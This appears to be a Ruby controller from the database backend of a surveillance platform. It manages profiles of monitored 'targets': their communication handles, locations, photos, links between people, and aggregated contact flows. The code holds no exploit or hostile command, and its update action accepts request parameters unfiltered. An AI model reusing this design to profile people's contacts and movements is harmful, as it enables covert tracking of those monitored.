#
# Controller for Entity
#

require_relative '../link_manager'

module RCS
module DB

class EntityController < RESTController

  def index
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do
      fields = ["type", "level", "name", "desc", "path", "photos", 'position', 'position_attr', 'links']
      entities = []

      # TODO: don't send ghost entities
      # ::Entity.in(user_ids: [@session.user[:_id]]).ne(level: :ghost).only(fields)
      ::Entity.in(user_ids: [@session.user[:_id]]).only(fields).each do |ent|
        ent = ent.as_document
        link_size = ent['links'] ? ent['links'].size : 0
        ent.delete('links')
        ent['num_links'] = link_size
        ent['position'] = {longitude: ent['position'][0], latitude: ent['position'][1]} if ent['position'].is_a? Array
        entities << ent
      end

      ok(entities)
    end
  end

  def flow
    require_auth_level :view

    mongoid_query do
      # find the current operation
      operation_id = Entity.find(@params[:entities].first).path.first

      # aggregate all the entities by their handles' handle
      # so if 2 entities share the same handle you'll get {'foo.bar@gmail.com' => ['entity1_id', 'entity2_id']}
      # TODO: the type should be also considered as a key with "$handles.handle"
      group = {:_id=>"$handles.handle", :entities=>{"$addToSet"=>"$_id"}}
      match = {:_id => {'$in' => @params[:entities]}}
      handles_and_entities = Entity.collection.aggregate [{'$match' => match}, {'$unwind' => '$handles' }, {'$group' => group}]
      handles_and_entities = handles_and_entities.inject({}) { |hash, h| hash[h["_id"]] = h["entities"]; hash }

      # take all the tagerts of the current operation:
      # take all the entities of type target and for each of these take the second id in the "path" (the "target" id)
      or_filter = @params[:entities].map { |id| {id: id} }
      target_entities = Entity.where(type: :target).any_of(or_filter)
      targets = target_entities.map { |e| e.path[1] }

      # take all the aggregates of the selected targets
      # TODO: only the aggregates with sender and peer, discard the others (with only the peer information)
      aggregates = targets.map { |t| Aggregate.target(t).between(day: @params[:from]..@params[:to]).all }.flatten

      # for each day: get all the couple (sender, peer) with the sum of the counter
      days = {}
      aggregates.each do |aggregate|
        data = aggregate.data
        handles = [data['sender'], data['peer']]
        handles.reverse! if data['versus'] == :in
        days[aggregate.day] ||= {}

        # repalce the handles couple with the entities' ids
        next unless handles_and_entities[handles.first]
        next unless handles_and_entities[handles.last]

        entities_ids = handles_and_entities[handles.first].product handles_and_entities[handles.last]
        entities_ids.each do |entity_ids|
          days[aggregate.day][entity_ids] ||= 0
          days[aggregate.day][entity_ids] += aggregate.count
        end
      end

      return ok(days)
    end
  end

  def show
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do
      ent = ::Entity.where(_id: @params['_id']).in(user_ids: [@session.user[:_id]]).only(['type', 'level', 'name', 'desc', 'path', 'photos', 'position', 'position_attr', 'handles', 'links'])
      entity = ent.first
      return not_found if entity.nil?

      # convert position to hash {:latitude, :longitude}
      entity = entity.as_document
      entity['position'] = {longitude: entity['position'][0], latitude: entity['position'][1]} if entity['position'].is_a? Array

      # don't send ghost links
      # TODO: don't send ghost links
      #entity['links'].keep_if {|l| l['level'] != :ghost} if entity['links']

      ok(entity)
    end
  end

  def create
    require_auth_level :view
    require_auth_level :view_profiles

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :intelligence

    mongoid_query do

      operation = ::Item.operations.find(@params['operation'])
      return bad_request('INVALID_OPERATION') if operation.nil?

      e = ::Entity.create! do |doc|
        doc[:path] = [operation._id]
        doc.users = operation.users
        doc[:name] = @params['name']
        doc[:type] = @params['type'].to_sym
        doc[:desc] = @params['desc']
        doc[:level] = :manual
        if @params['position']
          doc.position = [@params['position']['longitude'], @params['position']['latitude']]
          doc.position_attr[:accuracy] = @params['position_attr']['accuracy']
        end
      end

      Audit.log :actor => @session.user[:name], :action => 'entity.create', :desc => "Created a new entity named #{e.name}"

      # convert position to hash {:latitude, :longitude}
      entity = e.as_document
      entity['position'] = {longitude: entity['position'][0], latitude: entity['position'][1]}  if entity['position'].is_a? Array
      entity.delete('analyzed')

      return ok(entity)
    end    
  end

  def update
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do
      entity = ::Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if key == 'path'
          value.collect! {|x| Moped::BSON::ObjectId(x)}
        end
        if entity[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session.user[:name], :action => 'entity.update', :desc => "Updated '#{key}' to '#{value}' for entity #{entity.name}"
        end
      end

      entity.update_attributes(@params)

      return ok(entity)
    end
  end

  def destroy
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])

      # entity created by target cannot be deleted manually, they will disappear with their target
      return conflict('CANNOT_DELETE_TARGET_ENTITY') if e.type == :target

      Audit.log :actor => @session.user[:name], :action => 'entity.destroy', :desc => "Deleted the entity #{e.name}"
      e.destroy

      return ok
    end
  end

  def add_photo
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@request[:content]['_id'])
      id = e.add_photo(@request[:content]['content'])

      Audit.log :actor => @session.user[:name], :action => 'entity.add_photo', :desc => "Added a new photo to #{e.name}"

      return ok(id)
    end
  end

  def add_photo_from_grid
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      file = GridFS.get(Moped::BSON::ObjectId.from_string(@params['_grid']), @params['target_id'])
      id = e.add_photo(file.read)

      Audit.log :actor => @session.user[:name], :action => 'entity.add_photo', :desc => "Added a new photo to #{e.name}"

      return ok(id)
    end
  end

  def del_photo
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      return not_found() unless e.del_photo(@params['photo_id'])

      Audit.log :actor => @session.user[:name], :action => 'entity.del_photo', :desc => "Deleted a photo from #{e.name}"

      return ok
    end
  end

  def add_handle
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      e.handles.create!(level: :manual, type: @params['type'].downcase, name: @params['name'], handle: @params['handle'].downcase)

      Audit.log :actor => @session.user[:name], :action => 'entity.add_handle', :desc => "Added a new handle to #{e.name}"

      return ok
    end
  end

  def del_handle
    require_auth_level :view
    require_auth_level :view_profiles

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      e.handles.find(@params['handle_id']).destroy

      Audit.log :actor => @session.user[:name], :action => 'entity.del_handle', :desc => "Deleted an handle from #{e.name}"

      return ok
    end
  end

  def most_contacted
    require_auth_level :view
    require_auth_level :view_profiles

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :correlation

    mongoid_query do
      entity = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      return conflict('NO_AGGREGATES_FOR_ENTITY') unless entity.type.eql? :target

      # extract the most contacted peers for this entity
      contacted = Aggregate.most_contacted(entity.path.last.to_s, @params)

      return ok(contacted)
    end
  end

  def add_link
    require_auth_level :view
    require_auth_level :view_profiles

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :intelligence

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      e2 = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['entity'])

      return not_found() if e.nil? or e2.nil?

      link = RCS::DB::LinkManager.instance.add_link(from: e, to: e2, level: :manual, type: @params['type'].to_sym, versus: @params['versus'].to_sym, rel: @params['rel'])

      Audit.log :actor => @session.user[:name], :action => 'entity.add_link', :desc => "Added a new link between #{e.name} and #{e2.name}"

      return ok(link)
    end
  end

  def edit_link
    require_auth_level :view
    require_auth_level :view_profiles

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :intelligence

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      e2 = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['entity'])

      return not_found() if e.nil? or e2.nil?

      link = RCS::DB::LinkManager.instance.edit_link(from: e, to: e2, level: :manual, type: @params['type'].to_sym, versus: @params['versus'].to_sym, rel: @params['rel'])

      Audit.log :actor => @session.user[:name], :action => 'entity.add_link', :desc => "Added a new link between #{e.name} and #{e2.name}"

      return ok(link)
    end
  end

  def del_link
    require_auth_level :view
    require_auth_level :view_profiles

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :intelligence

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      e2 = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['entity'])

      return not_found() if e.nil? or e2.nil?

      RCS::DB::LinkManager.instance.del_link(from: e, to: e2)

      Audit.log :actor => @session.user[:name], :action => 'entity.del_link', :desc => "Deleted a link between #{e.name} and #{e2.name}"

      return ok
    end
  end

  def merge
    require_auth_level :view
    require_auth_level :view_profiles

    return conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :intelligence

    mongoid_query do

      e = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
      e2 = Entity.any_in(user_ids: [@session.user[:_id]]).find(@params['entity'])

      return not_found() if e.nil? or e2.nil?

      e.merge(e2)

      Audit.log :actor => @session.user[:name], :action => 'entity.merge', :desc => "Merged entity '#{e.name}' and '#{e2.name}'"

      return ok(e)
    end
  end

end

end #DB::
end #RCS::